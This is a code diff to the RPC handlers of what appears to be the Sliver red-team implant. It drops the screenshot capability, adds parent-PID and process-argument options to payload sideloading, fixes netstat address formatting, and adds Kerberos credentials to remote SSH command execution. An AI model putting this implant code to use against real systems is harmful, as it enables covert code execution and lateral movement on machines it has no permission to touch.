@@ -31,7 +31,6 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/netstat"
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/ps"
-	"github.com/bishopfox/sliver/implant/sliver/screen"
 	"github.com/bishopfox/sliver/implant/sliver/shell/ssh"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -121,7 +120,7 @@ func sideloadHandler(data []byte, resp RPCResponse) {
 	if err != nil {
 		return
 	}
-	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetData(), sideloadReq.GetArgs(), sideloadReq.Kill)
+	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetProcessArgs(), sideloadReq.GetPPid(), sideloadReq.GetData(), sideloadReq.GetArgs(), sideloadReq.Kill)
 	errStr := ""
 	if err != nil {
 		errStr = err.Error()
@@ -171,25 +170,6 @@ func ifconfig() *sliverpb.Ifconfig {
 		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
 	}
 	return interfaces
-}
-
-func screenshotHandler(data []byte, resp RPCResponse) {
-	sc := &sliverpb.ScreenshotReq{}
-	err := proto.Unmarshal(data, sc)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	// {{if .Config.Debug}}
-	log.Printf("Screenshot Request")
-	// {{end}}
-	scRes := &sliverpb.Screenshot{}
-	scRes.Data = screen.Screenshot()
-	data, err = proto.Marshal(scRes)
-
-	resp(data, err)
 }
 
 func netstatHandler(data []byte, resp RPCResponse) {
@@ -281,11 +261,11 @@ func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEnt
 		}
 		entries = append(entries, &sliverpb.SockTabEntry{
 			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
-				Ip:   e.LocalAddr.String(),
+				Ip:   e.LocalAddr.IP.String(),
 				Port: uint32(e.LocalAddr.Port),
 			},
 			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
-				Ip:   e.RemoteAddr.String(),
+				Ip:   e.RemoteAddr.IP.String(),
 				Port: uint32(e.RemoteAddr.Port),
 			},
 			SkState: e.State.String(),
@@ -315,7 +295,11 @@ func runSSHCommandHandler(data []byte, resp RPCResponse) {
 		commandReq.Username,
 		commandReq.Password,
 		commandReq.PrivKey,
-		commandReq.Command)
+		commandReq.Krb5Conf,
+		commandReq.Keytab,
+		commandReq.Realm,
+		commandReq.Command,
+	)
 	commandResp := &sliverpb.SSHCommand{
 		Response: &commonpb.Response{},
 		StdOut:   stdout,
